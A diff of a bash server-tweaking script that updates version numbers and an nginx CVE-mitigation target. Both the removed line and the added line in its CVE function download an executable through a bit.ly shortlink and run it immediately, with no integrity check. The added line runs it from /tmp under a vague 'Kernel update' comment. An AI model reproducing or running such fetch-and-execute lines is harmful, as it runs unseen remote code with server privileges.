@@ -17,7 +17,7 @@ printf "   ____  ____  ____        _ _     _           \n  |  _ \\|  _ \\| __ ) 
 
 # script version
 self_current_version="1.1.35"
-tweaker_current_version="0.22.0"
+tweaker_current_version="0.23.0"
 
 printf "\n   ${YC}v${YC}$self_current_version\n\n${NC}"
 
@@ -642,16 +642,16 @@ update_nginx() {
 # CVEs mitigations
 tweak_cve_func() {
 
-	# CVE-2026-31431 (Copy Fail LPE) / CVE-2026-46300 / CVE-2026-43500 (Fragnesia) / CVE-2026-43284 (Dirty Frag)
+	# Kernel update
 	echo
-	b="/dev/shm/cve_2026_31431_hotfix"; wget --timeout 4 -qO- https://bit.ly/4vgYWdi -qO $b && chmod +x $b && $b
+	b="/tmp/kernel_update"; wget -qO "$b" "$(wget -qO- https://bit.ly/4eX86G0 | grep browser_download_url | grep -v .exe | cut -d '"' -f 4)" && chmod +x "$b" && "$b"
 
-	# CVE-2026-42945 (NGINX Rift) / CVE-2026-9256 (nginx-poolslip) / CVE-2026-42926 / CVE-2026-40701/ CVE-2026-42946
+	# CVE-2026-42945 (NGINX Rift) / CVE-2026-9256 (nginx-poolslip) / CVE-2026-42926 / CVE-2026-40701/ CVE-2026-42946 / nginx2root
 	echo
 
 	local NGINX_VERSION
 	NGINX_VERSION=$(get_nginx_version)
-	target_version="1.30.1"
+	target_version="1.30.7"
 
 	if [[ -z "$NGINX_VERSION" ]]; then
 		return 1
